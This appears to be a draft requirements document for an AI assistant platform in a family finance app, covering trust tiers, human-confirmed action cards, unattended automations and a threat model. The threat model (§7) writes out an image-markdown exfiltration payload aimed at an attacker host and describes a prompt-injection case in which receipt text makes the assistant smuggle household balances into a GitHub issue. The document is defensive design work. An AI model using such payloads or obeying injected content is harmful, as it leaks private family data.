# AI Capability Platform — Business Requirements Document

**Status:** Draft
**Author:** Jared Carrano
**Date:** 2026-09-13
**Version:** 1.0

---

## 1. Overview

### 1.1 Problem Statement

The app's AI surface grew feature-by-feature: a read-only chatbot (budgeting only), a bulk categorization flow, Amazon receipt vision, and a narrow action-card write path with two registered actions. Each was specified in isolation, and each carried its own security reasoning. The result is a capable but lopsided assistant:

- **It can only see money.** All eight chatbot read tools are financial. Tasks, trips, projects, and the wishlist are invisible to it, so "what's on our list this weekend?" is unanswerable — and, more importantly, a planner that cannot see the board cannot propose good moves.
- **It can barely act.** Two write actions exist (`create_task`, `submit_github_issue`), one per card, one card per conversation. Anything bulk or multi-step is out of reach.
- **Nothing is repeatable.** Every new capability re-litigates the trust model from scratch, because the trust model lives in prose across two BRDs rather than in the registry as data.

The question this document answers is not "what else can the AI do?" but "what is the governing model under which new AI capability gets added, such that the twentieth action is as safe as the first?"

### 1.2 Solution Summary

A single capability platform with four explicit trust tiers, enforced structurally:

| Tier | Name | Authorization | Example |
|------|------|---------------|---------|
| **T0** | Read | Implicit (authenticated session) | `query_transactions`, `get_trip_itinerary` |
| **T1** | Confirmed write | Explicit per-occurrence human click | Create a trip stop, split a transaction |
| **T2** | Pre-authorized write | Standing consent, granted in advance per-automation | Auto-categorize a transaction |
| **T3** | Forbidden | None — structurally unreachable | Anything touching auth, Plaid linkage, money movement, outbound sends |

Every capability declares its tier **in the registry definition**, not in a comment or a reviewer's memory. The tier determines which gates the platform enforces at runtime.

### 1.3 What Already Exists

This document builds on working code, not a greenfield design. An honest inventory:

| Component | File | State |
|-----------|------|-------|
| Read-only data boundary | `services/chatbotDataService.ts` | Solid. `ReadOnlyDataService` injected; structurally cannot write (SEC-018). |
| Action registry | `services/chatActions/registry.ts` | Solid. `Map`-based allowlist (prototype-pollution safe), Zod schema per action, JWT-derived context. |
| Proposal nonces | `services/chatActions/proposalStore.ts` | Solid mechanism, **in-memory** — single-process only, does not survive restart. |
| Audit log | `services/chatActions/auditLog.ts` | Structured success/rejection logging to CloudWatch. Not surfaced in UI. |
| Registered actions | `createTaskAction.ts`, `submitGithubIssueAction.ts` | Two. `create_task` correctly re-uses `createTaskSchema` from the HTTP route. |
| Cost cap | `services/chatbotCostTracker.ts` | $20/mo, mutex-guarded, already segmented **per workspace**. |
| Output rendering | `frontend/src/components/chat/ChatMessageBubble.tsx` | Markdown via `react-markdown` + `remark-gfm`, behind a narrowed `rehype-sanitize` allowlist (TD-015). `img` is **not** allowlisted, so remote images are already blocked. External `http`/`https` links **are** clickable — see §7.3. |

The last row matters more than it looks — see §7.3.

### 1.4 Relationship to Existing BRDs

Both existing AI BRDs remain the authoritative record of their own feature. This document governs the model *across* them and supersedes specific clauses:

| Document | Status | Superseded clauses |
|----------|--------|--------------------|
| [AI-CHATBOT-BRD.md](AI-CHATBOT-BRD.md) | Current | SEC-010 (single $20 cap) → superseded by §8 split caps. SEC-001–009, SEC-018 unchanged and binding. |
| [AI-CHAT-ACTIONS-BRD.md](AI-CHAT-ACTIONS-BRD.md) | Current | SEC-A007 ("one action proposal per conversation") → **narrowed, not removed**: still one *proposal* per conversation, but a proposal may now carry multiple rows (§5). D-14 (action outcomes not persisted) → superseded by §6.3 activity log. |
| [AI-CATEGORIZATION-BRD.md](AI-CATEGORIZATION-BRD.md) | Current | None. Becomes the first T2 candidate (§9.1). |
| [AI-AMAZON-RECEIPT-BRD.md](AI-AMAZON-RECEIPT-BRD.md) | Current | None. Remains a purpose-built flow outside the chat surface. |

### 1.5 Users

Both household users, on the existing shared-family model. One additional non-family actor appears in §15: the maintainer (Jared), as the reviewer of agent-authored learnings.

---

## 2. Conceptual Model

### 2.1 The Pattern and Its Name

The architecture already in place has a name worth leaning into, because naming it correctly imports a body of prior art and makes review checklists obvious.

**The LLM is a planner, not an executor.** Model output is *untrusted data describing an intent* — never authority to act. Concretely, this is the **propose-confirm pattern** (also called human-in-the-loop tool approval), implemented over a **server-side capability registry**:

1. The model calls `propose_action` — a tool that, uniquely, the backend **intercepts and never executes**.
2. The proposal is validated against a Zod schema that is the *same schema the human UI's endpoint uses*.
3. A single-use, expiring nonce is issued — structurally identical to CSRF-token logic, applied to agent intent rather than form submission.
4. A human sees every field that will be written and clicks.
5. Execution runs server-side, as the JWT's user, through the same service-layer business rules any HTTP caller faces.

The security property is not "the model is well-behaved." It is: **a compromised, confused, or injected model can only produce a proposal that a human then declines.**

### 2.2 Security Canon

| Concept | Source | Application here |
|---------|--------|------------------|
| **Lethal trifecta** | Simon Willison | Private data + untrusted content + exfiltration vector = compromise. We hold the first two; §7.3 keeps the third closed by policy. |
| **Agents Rule of Two** | Meta (2025) | An agent session should have at most two of: untrusted input, access to sensitive systems, ability to change state or communicate externally. T1/T2 gating is how we stay under two. |
| **LLM01 — Prompt Injection** | OWASP LLM Top 10 | §7.2 inventories every injection surface. |
| **LLM06 — Excessive Agency** | OWASP LLM Top 10 | The tier system exists specifically to bound agency; T3 makes the bound structural. |

### 2.3 Rejected Alternative: Client-Replays-The-Mutation

An intuitive design — the agent drafts an API call, the card carries endpoint + payload, and on Confirm the **frontend** issues it with the user's own credentials — was considered and rejected.

It appears safer ("the agent never executes anything; the user's own browser does") but is strictly weaker: to send an endpoint and payload to the client, the **allowlist moves to the client**. A prompt-injected proposal can then aim at any endpoint the session can reach, and the browser becomes a confused deputy. The frontend cannot meaningfully validate what it was told to call.

The registry design achieves the same goals — executes as the user, same validation, same business rules, no elevated path — while keeping the allowlist on the trusted side of the boundary. The card carries an opaque `actionId` plus parameters; the server resolves what that means. **(D-P01)**

> Note: the codebase is REST/Express, not GraphQL. The equivalent of "must be expressible as a GraphQL mutation the user could send" is: **every action must map to an endpoint a human already has in the UI, re-using that route's exported Zod schema.** `createTaskAction.ts` is the reference implementation — it imports `createTaskSchema` directly from `routes/tasks.ts`.

---

## 3. Trust Tiers

### 3.1 Tier Definitions

| ID | Requirement |
|----|-------------|
| REQ-P001 | Every registered capability (read tool or write action) must declare a `tier` of `T0`, `T1`, or `T2` in its registry definition. Registration without a tier must throw at startup. |
| REQ-P002 | The tier must be enforced at execution time by the platform, not by the capability's own handler. A T1 action must be structurally unable to execute without a consumed nonce. Grants are branded values only `proposalStore` mints; `executionGrantCallSites.test.ts` scans production source and fails if anything else mints one or calls a handler directly — which is what turns "greppable" into "enforced", given JS has no module-private constructor. |
| REQ-P003 | T3 is not a declarable tier. It is the set of operations no registry entry may wrap; enforcement is by the absence of a registration plus the service-layer isolation already required by SEC-001–003. |
| REQ-P004 | Tier changes (promoting an action from T1 to T2) must be a deliberate code change reviewed against §3.3, not a configuration toggle. |

### 3.2 Tier 2 Gates

An action qualifies for unattended execution only if it passes **all four** gates. These are cumulative, not alternatives.

| ID | Gate | Requirement |
|----|------|-------------|
| SEC-P001 | **Reversible in one click** | The action must be fully undoable by either user from the UI, with the undo surfaced where the change appears. Any action that sends, notifies, hard-deletes, or moves money is disqualified permanently. |
| SEC-P002 | **Explicit standing consent** | The specific automation is off by default and must be enabled per-automation in settings. There is no global "let the AI act" switch. Enabling is the human-in-the-loop moment, relocated earlier in time rather than removed. |
| SEC-P003 | **Bounded data class** | The action must touch classification/metadata only (category assignment, tags, sort order, snooze state, user descriptions). It must never touch credentials, Plaid linkage, budget amounts, account data, or anything outbound. Enforced by an explicit `dataClass` field on the registry definition, validated at registration. |
| SEC-P004 | **Rate and batch caps with digest review** | Unattended writes are capped per automation (writes/day, max batch size). Every one lands in a reviewable activity log with bulk undo (§6.3). Exceeding a cap disables the automation and notifies, rather than silently continuing. |

**Rationale for reversibility over confidence.** A confidence threshold ("act when the model is >95% sure") is the intuitive gate and the wrong one. Self-reported confidence is not calibrated, and thresholding it moves the failure mode somewhere unobservable. With two users and a model that will sometimes be wrong, "the AI was sure" protects nothing while "one click restores it" protects everything. **(D-P02)**

### 3.3 Tier 3 — Permanent Exclusions

No AI path, attended or unattended, may reach the following. This list is additive-only; removing an entry requires a BRD amendment.

- Authentication, password, session, or JWT operations
- Plaid item linkage, re-auth, access tokens, or the encryption key (already SEC-001–003)
- Any outbound send on the family's behalf: email, SMS, calendar invites, payments
- Budget **amount** creation or modification without confirmation (T1 permitted, T2 forbidden)
- Hard deletion of any user-authored record
- The Business Workspace, in full — reads included (§11)

---

## 4. Capability Registry Architecture

The existing `chatActions/registry.ts` generalizes into the single place where AI capability is declared. Read tools and write actions both become registry entries so that tier, data class, and audit behavior are described uniformly.

| ID | Requirement |
|----|-------------|
| REQ-P010 | Both read tools and write actions must be registered in a single capability registry. Tool definitions sent to the model must be **derived** from the registry, not maintained separately in `chatbotPrompt.ts`. **Implemented:** `services/capabilities/readCapabilities.ts` pairs each read tool's definition with its executor; `buildChatbotTools()` derives the array. Write actions remain in the chat action registry and are never exposed as tools — they reach the model only via `propose_action`. |
| REQ-P011 | Every write action must re-use the Zod schema exported by the HTTP route that serves the equivalent human UI flow. Defining a parallel schema for an action is prohibited — it creates two sources of truth for validation. |
| REQ-P012 | Every write action must execute through the existing service layer, never through direct storage access, so that business rules apply identically to AI-originated and human-originated writes. |
| REQ-P013 | Handler context remains JWT-derived only (`userId`, `familyId`). No identity, family, or privilege parameter may be accepted from model output. (Restates SEC-A002; now platform-wide.) |
| REQ-P014 | Registration must fail fast at startup on: duplicate `actionId`, missing tier, missing `dataClass`, or a T2 declaration whose `dataClass` is not in the permitted set. |
| REQ-P015 | A test must assert that the set of registered T2 actions equals an explicit hardcoded list. Adding a T2 action requires editing that list, making promotion visible in review. |
| REQ-P016 | The tool definitions exposed to the model must be filtered by workspace. The Business Workspace exposes no AI tools at all (§11). **Enforced.** `refuseBusinessWorkspace` in `routes/chatbot.ts` 403s every chatbot route when the JWT's active family is a business workspace; the frontend also hides the chat surface, but the route guard is the control. The `aiEnabled` flag on `buildChatbotTools` is a second layer, not the enforcement point — a flag nobody passes protects nothing. See Q-P07. |

### 4.1 Tool Surface Growth

Expanding to three domains takes the tool count from 9 toward ~25. Large flat tool lists degrade selection accuracy and inflate cached prompt size.

| ID | Requirement |
|----|-------------|
| REQ-P017 | Tool definitions must remain prompt-cached (the existing `CACHED_CHATBOT_TOOLS` pattern). Cache breakpoints must be re-validated when the tool list changes materially. |
| REQ-P018 | If the tool count exceeds 20, tools must be grouped by domain and exposed progressively rather than as a single flat list. Measurement before optimization: this is triggered by observed misselection, not by the count alone. |
| REQ-P019 | Every tool description must accurately describe what the tool returns. A description that promises fields the implementation does not return is treated as a defect of the same severity as a wrong return value (§7.4). |

---

## 5. Consent Model — Plan Cards

### 5.1 Structure

Today a proposal carries exactly one write. That is correct for "create a task" and fails immediately for anything useful: "recategorize these 40 transactions" is one intent and forty writes; "plan our Portland trip" is one intent and a heterogeneous chain.

A **plan card** is one proposal carrying N proposed writes, each rendered as an individually reviewable row with a checkbox.

| ID | Requirement |
|----|-------------|
| REQ-P020 | A proposal may contain 1..N rows. Rows may be homogeneous (40 recategorizations) or heterogeneous (create trip → add stops → tag budget). |
| REQ-P021 | Each row must be independently de-selectable. Confirm executes exactly the checked rows. |
| REQ-P022 | Rows are ordered and executed as a single batch under one confirmation, producing one undo handle for the whole batch. (Ordering and batching shipped in Phase 1; the undo handle is Phase 4.) |
| REQ-P023 | Execution is all-or-nothing per confirmation. A row failing server-side validation rolls back the batch and reports which row failed and why. **Partially shipped.** Every checked row is validated before any row executes, so a batch that *would* fail validation writes nothing. A storage failure partway through execution still leaves the earlier rows applied; the response names the failing row and the number applied. The remaining gap closes with REQ-P025 (durable undo handles) in Phase 4 — there is no rollback to perform until prior state is recorded. The failure response names the failing row and how many rows were applied, and the frontend surfaces that body verbatim rather than axios's "Request failed with status code 500"; the card then withdraws Confirm and Edit, because the nonce is spent whether or not execution succeeded. |
| REQ-P024 | Every row must be re-validated by its action's Zod schema at confirm time, independently. A row edited by the user is validated as edited. (Extends SEC-A004.) |

### 5.2 Legibility

The plan card is the mechanism by which this design trades per-action scrutiny for usability. That trade is only sound if the rows are actually readable — a forty-row card that nobody reads is a single click authorizing forty writes.

| ID | Requirement |
|----|-------------|
| SEC-P010 | Each row must display the **real values** that will be written — resolved human-readable names, not IDs, and not a model-authored summary of itself. A row the UI cannot fully render must be rejected rather than truncated. (Extends SEC-A008.) **Enforced as coverage, not presence:** `buildProposalRows` rejects any row whose server-parsed params contain a key with no matching `displayField`. Shape-checking alone was not enough — the dangerous proposal is a well-formed row showing a plausible title while `params.body` carries 64 KB the user never sees, which is a one-click exfiltration primitive for `submit_github_issue` and authorable by injected content in an uploaded receipt. Also rejects: non-array `displayFields`, empty-string values (they render as nothing), duplicate keys (one silently disappears in render), and an empty field list. |
| SEC-P011 | Rows must display the *current* value alongside the proposed value for any update, so the user sees what changes rather than only what it becomes. The comparison is produced by the action's own `describeCurrent` hook on the server; `propose_action` deliberately has no field for it, so the model cannot narrate what it is about to overwrite. Both shipped actions are creates and populate nothing; the first implementers are the Phase 3 update actions. |
| SEC-P012 | Cards exceeding a legibility threshold (initially 25 rows) must group rows by action type with per-group select-all, and must surface a count-by-type summary above the rows. The summary supplements the rows; it never replaces them. |
| SEC-P013 | The confirm control must state the exact count being executed ("Apply 38 changes"), derived from checked rows at click time. |

### 5.3 Effect on SEC-A007

SEC-A007 ("only one action proposal may be active per conversation") is **preserved**, not superseded. A plan card is a single proposal. The one-active-proposal invariant, the single-use nonce, the 15-minute TTL, and atomic supersession all continue to hold unchanged — which is the main reason this design was chosen over issuing multiple concurrent cards.

### 5.4 Undo

| ID | Requirement |
|----|-------------|
| REQ-P025 | Every confirmed batch must produce a durable undo handle recording the prior state of each affected record. |
| REQ-P026 | Undo must be available from the activity log (§6.3) and, for recent batches, inline in the conversation. |
| REQ-P027 | Undo must be idempotent and must degrade safely: if a record was modified after the batch, undo must skip that record and report it rather than clobbering newer changes. |

### 5.5 Proposal Durability

| ID | Requirement |
|----|-------------|
| REQ-P028 | The proposal store must persist across process restart before unattended proposals (§6) ship. The current in-memory `Map` is acceptable for conversation-scoped cards on a single PM2 process; it is not acceptable for a queue a background agent writes to and a human reviews hours later. |
| REQ-P029 | If the deployment ever becomes multi-process, nonces must move to a shared store. (Restates the existing note in `proposalStore.ts`.) |

---

## 6. Unattended Execution (T2)

### 6.1 Standing Consent

| ID | Requirement |
|----|-------------|
| REQ-P030 | Each T2 automation must have its own settings toggle, off by default, with plain-language copy describing exactly what it will do, how often, and how to undo it. |
| REQ-P031 | Enabling an automation must be attributed and logged (who enabled it, when). Either family member may enable or disable any automation. |
| REQ-P032 | A single global kill switch must disable all unattended execution immediately, independent of per-automation toggles. |
| REQ-P033 | A T2 automation that has been disabled must not have queued work execute after the toggle flips off. |

### 6.2 Caps

| ID | Requirement |
|----|-------------|
| REQ-P034 | Each T2 automation declares a maximum writes-per-day and maximum batch size at registration. |
| REQ-P035 | Exceeding a cap must disable the automation and surface a notice, not silently truncate or continue. |
| REQ-P036 | Unattended runs must be idempotent with respect to their trigger — a re-run over the same input must not duplicate writes. |

### 6.3 Activity Log

| ID | Requirement |
|----|-------------|
| REQ-P037 | Every AI-originated write — attended or unattended — must appear in a user-facing activity log showing: when, which automation or conversation, what changed (before → after), and an undo control. |
| REQ-P038 | The activity log must support bulk undo across a batch and across a time range. |
| REQ-P039 | Unattended writes must be visually marked wherever the affected record is displayed (e.g. an "auto" indicator on a categorized transaction) until acknowledged, so silent changes are never silent. |
| REQ-P040 | This supersedes D-14 of the Chat Actions BRD, which deliberately did not persist action outcomes across sessions. That decision was correct when every write required a click and was visible in-conversation; it does not survive unattended writes. |

---

## 7. Threat Model

### 7.1 Trifecta Position

| Leg | Present? | Notes |
|-----|----------|-------|
| Access to private data | **Yes** | Full family financial history, tasks, trips. Non-negotiable — it is the product. |
| Exposure to untrusted content | **Yes** | See §7.2. Cannot be eliminated; Plaid merchant strings and uploaded attachments are inherently attacker-influenceable. |
| Exfiltration vector | **Rendering: closed by policy. Outbound actions: closed by SEC-P010.** | Two vectors, not one. §7.3 closes *rendering* — no remote images, no active content. But `submit_github_issue` is itself an outbound channel with a server-held token, and an adversarial review found the real hole was not the renderer: a row could carry a 64 KB `body` the card never displayed, so injected receipt text could author a plausible-looking bug report containing the household's balances and the user would approve it having read only the title. Closed by requiring every written param to appear on the card (SEC-P010). Any future action with an outbound effect re-opens this question and must be assessed against it, not waved through on §7.3. |

Because two legs are structural, **the entire injection defense rests on the third**. This elevates §7.3 from a rendering preference to the load-bearing control in the system.

### 7.2 Injection Surface Inventory

| Surface | Trust | Control |
|---------|-------|---------|
| Uploaded attachments (flyers, receipts, PDFs) | Untrusted | Passed as vision/document content blocks, never interpolated into the system prompt (SEC-A009). Never echoed verbatim (SEC-A012). |
| Plaid transaction names / merchant names | Untrusted | Reaches the model only as tool *results*, never as prompt text (SEC-007). |
| Task titles, trip notes, project names | Semi-trusted (spouse-authored) | Treated as untrusted for defense purposes — a household member is not a threat, but content they paste in may be. |
| Page context supplied with each message | Trusted (app-generated) | Must remain app-constructed; must never include free text echoed from a URL parameter. |
| Agent-authored learnings (§15) | Untrusted on read | A learning is model-authored text a human later acts on. See §15.2. |

| ID | Requirement |
|----|-------------|
| SEC-P020 | No untrusted content may be interpolated into a system prompt. All data reaches the model as structured tool results or typed content blocks. (Platform-wide restatement of SEC-007 / SEC-A009.) |
| SEC-P021 | Tool results must be structurally distinguishable from instructions in the transcript. Free-text concatenation of data into an assistant turn is prohibited. |

### 7.3 Output Rendering Policy — Load-Bearing Invariant

Assistant output is rendered as markdown (`react-markdown` + `remark-gfm`) behind a deliberately narrowed `rehype-sanitize` allowlist, hardened under TD-015. Measured against the requirements below, the current state is **mostly compliant**:

- **SEC-P023 is already satisfied.** `img` is absent from the allowlist, so the silent-exfiltration primitive is closed — and closed by design, not by accident.
- **SEC-P024 is not satisfied.** `protocols: { href: ['http', 'https', 'mailto'] }` makes external links clickable today.

The gap is real but lower severity than an image: an anchor requires a deliberate user click, whereas an image fetches on render. It is tracked as Q-P06 rather than treated as an incident.

| ID | Requirement |
|----|-------------|
| SEC-P022 | Same-origin internal application links are permitted and clickable. Action-card resource links (e.g. `/tasks?taskId=…`) are the canonical form. |
| SEC-P023 | **Remote images are prohibited without exception.** An image fetches automatically with no user interaction, making it the highest-severity exfiltration primitive: an injected `![](https://attacker/?d=<data>)` leaks silently on render. |
| SEC-P024 | External URLs appearing in model output must render as inert, non-clickable text. **Not currently enforced** — see Q-P06. |
| SEC-P025 | An automated test must assert this invariant and fail if the renderer is swapped, the sanitizer dropped, or the allowlist widened. The test is the control; the policy alone will not survive contact with a future feature. **Implemented:** `frontend/src/components/chat/ChatMessageBubble.security.test.tsx`, verified by mutation. |
| SEC-P026 | Any future request to render remote imagery (e.g. place photos in trip planning) must route through the existing server-side proxy pattern with a host allowlist, and must be specified as an amendment to this section rather than implemented ad hoc. |

**Accepted cost:** the agent cannot hand the user a clickable restaurant link while planning a trip. A URL rendered as copyable text is mildly annoying and leaks nothing. **(D-P03)**

### 7.4 Semantic Validation

Schema validation proves a value is well-formed, not that it refers to something real. Model-supplied identifiers are a known failure source in this codebase specifically: stored `categoryId` values are already known to go orphaned relative to the categories file, producing cell-vs-modal mismatches.

| ID | Requirement |
|----|-------------|
| SEC-P030 | Every model-supplied identifier must be resolved against live data at confirm time — category exists and is not orphaned, assignee is a family member, trip/project belongs to the family, transaction is not removed. Failure must surface a user-visible error, never a silent write. |
| SEC-P031 | All AI read paths must go through `transactionReader.ts` (`excludeRemoved()` / `getActiveTransactions()`). No AI tool may implement its own removed-status filter. |
| SEC-P032 | Tool results returning identifiers must also return the resolved human-readable name. A tool that returns bare IDs forces the model to join across tools, and an incomplete join is a confabulation trigger — see the worked example in §15.1. |
| SEC-P033 | Absence must be explicit. A tool must distinguish "no value is set" from "no data returned." Returning an empty collection for a queried entity that exists but has no value is prohibited, because the model cannot distinguish it from a failed lookup. |

---

## 8. Cost and Budget Model

The existing $20/month cap was sized for a human typing into a chat overlay, with spend bounded by attention. Unattended work inverts that: spend becomes a function of data volume and a cron schedule. A single categorization sweep over a month of transactions can cost more than a week of conversation.

| ID | Requirement |
|----|-------------|
| REQ-P050 | Spend must be capped per **workload class**, not as a single pool. Initial classes: `interactive` (chat, attachments) and `background` (unattended automations, scheduled digests). |
| REQ-P051 | Each workload class has an independent cap and an independent kill switch. Exhausting the background budget must never prevent a user from using the chatbot. |
| REQ-P052 | Caps are per workspace × workload class. The existing per-workspace segmentation in `chatbotCostTracker.ts` is the correct dimension to extend, not replace. |
| REQ-P053 | Cost tracking must remain concurrency-safe (mutex or equivalent) across both classes. (Restates SEC-017.) |
| REQ-P054 | Background work must route to the cheapest model adequate for the task. Classification, clustering, and extraction are fast-tier work; conversational reasoning is frontier-tier. Model selection is per-capability and declared in the registry. |
| REQ-P055 | A pre-flight estimate must bound any background batch before it runs. A batch whose estimate exceeds the remaining background budget must not start partially. |
| REQ-P056 | Model identifiers in `chatbotService.ts` and `categorizationService.ts` must be reviewed against current available models when this work begins; they are pinned to an older generation. **Still open** — not addressed by the split-cap work. |

**Implemented:** REQ-P050–P055 in `chatbotCostTracker.ts`. Interactive deliberately keeps the original storage key (`chatbot_costs_{familyId}_{month}`); suffixing it would have orphaned the current month's accrued spend and silently reset the running total, repeating the one-time reset D11 already paid for. Background writes to a new key. `canAffordBatch` implements the REQ-P055 pre-flight so a sweep that cannot finish never starts.

> Confirmation is deliberately free: confirming a pending card performs no LLM call, so a cap exhausted between proposal and confirmation does not strand a valid card. (Preserves SEC-A020.)

---

## 9. Domain Capability Inventory

Domains are added **read-first, write-second**: a domain earns write actions only after its read tools prove useful in practice. Read coverage is the larger near-term win, because the assistant currently cannot see two-thirds of the app.

### 9.1 Budgeting & Transactions

*Reads exist today.* `query_transactions`, `get_categories`, `get_budgets`, `get_budget_summary`, `get_accounts`, `get_spending_by_category`, `get_cash_flow`, `get_auto_categorization_rules`.

| Capability | Tier | Notes |
|-----------|------|-------|
| Set transaction category | **T2 candidate** | Reversible, metadata-only, bounded. The flagship unattended automation; builds on AI-CATEGORIZATION-BRD. |
| Set `userDescription` | T2 candidate | Reversible, metadata-only. |
| Tag transaction to project/trip line item | T2 candidate | Reversible. Must respect the non-additive actuals rule (§9.4). |
| Split a transaction | T1 | Creates child records; not cleanly reversible in one click. |
| Hide / unhide a transaction | T1 | Changes reported totals in BvA — user-visible financial impact. |
| Create or modify an auto-categorization rule | T1 | Forward-acting: one write changes all future categorization. Never T2. |
| Create or modify a budget amount | T1 | Explicitly excluded from T2 by SEC-P003. |

### 9.2 Tasks & Household Coordination

*No reads today* — `create_task` writes blind.

| Capability | Tier | Notes |
|-----------|------|-------|
| Query tasks (open, assigned, overdue, snoozed) | T0 | Highest-value missing read in the app. |
| Create task | T1 | Exists. |
| Update task fields | T1 | |
| Snooze / reorder | T2 candidate | Visibility and ordering only; trivially reversible. |
| Complete a task | **T1 — never T2** | Completion credits the leaderboard. An unattended completion silently awards points and corrupts a shared, competitive record. |
| Break a task into subtasks | T1 | Must model "both of us" as a parent plus per-person subtasks rather than inventing a multi-assignee field — `assigneeId` is deliberately single-valued. |

### 9.3 Trips & Projects

*Entirely invisible to the AI today.*

| Capability | Tier | Notes |
|-----------|------|-------|
| Read trips, itineraries, stops | T0 | |
| Read projects, line items, spending attribution | T0 | Subject to §9.4. |
| Add or move a stop | T1 | Stay-overlap validation must run server-side via `tripHelpers.ts`. |
| Create a project line item | T1 | |
| Tag a transaction to a line item | T2 candidate | |

### 9.4 Correctness Landmines the AI Must Respect

These are existing, documented invariants that a naive tool implementation will violate. Each must be enforced in the tool's return shape, not in prompt instructions.

| Landmine | Requirement |
|----------|-------------|
| **Line-item actuals are non-additive** | A transaction carrying two line-item tags counts fully toward both, so Σ(line item actuals) can exceed `totalSpent`. Tool results must **omit a total for that column** and return the *Unattributed* remainder instead. The model must never be in a position to sum it. |
| **Dismissed parent IDs are per-user localStorage** | Not `Category.isHidden`. No AI capability may read or write dismissal state; conflating the two would leak one user's dismissals into their spouse's view. |
| **Parent rollup is `max(parent, Σ children)`** | Any AI aggregation must use `shared/utils/budgetCalculations.ts`. Never reimplemented in a tool. |
| **Transfers are excluded** | Via `shared/utils/transactionCalculations.ts`. |
| **Rollover math** | Via `budgetCalculations.ts`; BvA remains its sole consumer. AI tools surface rollover values, never recompute them. |
| **Removed transactions** | Via `transactionReader.ts` only (SEC-P031). |
| **Express 5 body-less POST** | New AI routes must use `safeParse(req.body ?? {})`. This has already bitten twice. |

---

## 10. Audit and Observability

Diagnosis after the fact is only possible if the evidence was captured at the time. The governing tension: a complete transcript archive is a **second copy of the family's financial data**, in a less-guarded store, with longer retention than the conversation itself. Capture is therefore split by cost and sensitivity.

### 10.1 Structured Trace — Always On

| ID | Requirement |
|----|-------------|
| REQ-P060 | Every AI request must emit a structured trace containing: the ordered tool-call ledger (tool name, arguments, and **raw result**), iteration count, stop reason, per-call and total token counts, model used, workload class, latency, and whether a proposal was issued. |
| REQ-P061 | The trace must record tool results verbatim as returned to the model. A summarized or truncated result defeats the purpose — the diagnostic question is almost always "what did the model actually see?" |
| REQ-P062 | Traces must carry a correlation ID shared with the audit log entry and any resulting proposal, so a write can be traced back to the reasoning that produced it. |
| REQ-P063 | Default trace retention is 30 days. Traces referenced by an open learning (§15) are retained until that learning is closed. |

**Implemented:** `backend/src/services/agentTraceStore.ts`, wired into `ChatbotService`. One deviation worth recording: REQ-P061 asks for results verbatim, but an uncapped ledger would persist every transaction the model ever read. Results above 64 KB are therefore dropped and explicitly flagged `resultTruncated`, rather than silently shortened — a reader can always tell "this is what the model saw" from "this is a fragment of it". Attachments are recorded as mime type and byte count only.

### 10.2 Full Transcript — On Incident Only

| ID | Requirement |
|----|-------------|
| REQ-P064 | A full verbatim transcript (user turns, assistant turns, and thinking blocks where present) is captured **only** when an incident is flagged, and is bundled with the corresponding trace. |
| REQ-P065 | Thinking blocks, when captured, are diagnostic hints only. Reasoning text is a plausible account of the computation, not a faithful record of it, and must never be treated as evidence of why an output occurred. The tool ledger is the ground truth. |
| SEC-P040 | Incident bundles must **not** be written to the general application log stream (CloudWatch). They contain family financial conversation and require narrower access and shorter retention than operational logs. A dedicated store is required. |
| SEC-P041 | Traces and incident bundles must never contain: Plaid access tokens, the encryption key, credentials, or attachment bytes or extracted attachment text. Attachment capture is limited to metadata (MIME, size, page count) — this preserves SEC-A014 and SEC-A016, which a naive trace implementation would violate. |
| SEC-P042 | Trace and incident data is family-scoped and must be subject to the same authorization as the underlying data. |

---

## 11. Out of Scope

| Excluded | Rationale |
|----------|-----------|
| **Business Workspace — entirely, reads included** | It holds trust-ledger money that is not the family's and generates client statements. BUSINESS-WORKSPACE-BRD already excluded payment automation on fiduciary-risk grounds; that reasoning extends to AI reads. Carefully-scoped AI access to a fiduciary ledger is a worse trade than no access. |
| **Wishlist** | Small and self-contained; no compelling AI use case yet. Available later as a low-stakes proving ground for a new domain's action set. |
| **External integrations** | Email ingestion, calendar, third-party MCP servers. Each imports a new untrusted-content channel and would require re-opening §7. |
| **Outbound communication of any kind** | T3, permanently. |
| **Payment or money movement** | T3, permanently. |
| **Multi-agent orchestration** | No demonstrated need at two users. |

---

## 12. Phasing

| Phase | Scope | Exit criteria |
|-------|-------|---------------|
| **0 — Correctness** | Fix `get_budgets` (returns no actuals despite its description; returns bare IDs; absent budgets indistinguishable from no lookup). Add the §7.3 rendering-invariant test. | **Done.** The Subaru-class failure is covered by regression tests; the rendering invariant is locked and mutation-verified. |
| **1 — Foundations** | ~~Tier + dataClass in the registry~~ **done**; ~~tool definitions derived from it~~ **done**; ~~plan cards with per-row toggles~~ **done**; ~~split cost caps~~ **done**; ~~structured trace (§10.1)~~ **done**. | Existing two actions run unchanged on the new machinery. |
| **2 — Read coverage** | Task, trip, and project read tools. | The assistant can answer "what's on our plate this weekend?" |
| **3 — Confirmed writes** | T1 action set per §9. | Multi-step plan cards work end to end. |
| **4 — Activity log & undo** | Durable undo handles, user-facing activity log, bulk undo. | Every AI write is visible and reversible. Prerequisite for Phase 5. |
| **5 — Unattended tier** | Standing-consent settings, caps, kill switch; first T2 automation is transaction categorization. | An automation can be enabled, produces marked writes, and is bulk-undoable. |
| **6 — Proactive reads** | Scheduled digests and insight generation; may queue proposals for later approval, never writes. | Background budget holds; chat is never starved. |

Phase 4 gates Phase 5 deliberately: SEC-P001 (one-click reversibility) is unenforceable until undo exists, so unattended writes cannot ship before the thing that makes them survivable.

---

## 13. Decisions

| ID | Decision | Rationale |
|----|----------|-----------|
| D-P01 | Server-side allowlist; cards carry opaque `actionId` + params. Client does **not** replay mutations. | Client-side allowlists make the browser a confused deputy (§2.3). |
| D-P02 | T2 eligibility gates on reversibility, not model confidence. | Self-reported confidence is uncalibrated; undo is verifiable. |
| D-P03 | Internal links only; no remote images; external URLs inert. | Sole closeable leg of the lethal trifecta (§7.3). |
| D-P04 | Plan cards with per-row toggles, one proposal per conversation. | Handles bulk and chains with one mechanism while preserving SEC-A007. |
| D-P05 | Split cost caps by workload class. | Prevents a background job from starving interactive chat. |
| D-P06 | Business Workspace excluded entirely, reads included. | Fiduciary risk; consistent with its own BRD. |
| D-P07 | Structured trace always on; full transcript on incident only. | Diagnosis without a permanent shadow copy of all financial conversation. |
| D-P08 | Capability-gap learnings are agent-written; quality incidents are user-triggered and evidence-only. | An agent that confabulated cannot reliably diagnose its own confabulation (§15.1). |

---

## 14. Open Questions

| ID | Question | Proposed default |
|----|----------|------------------|
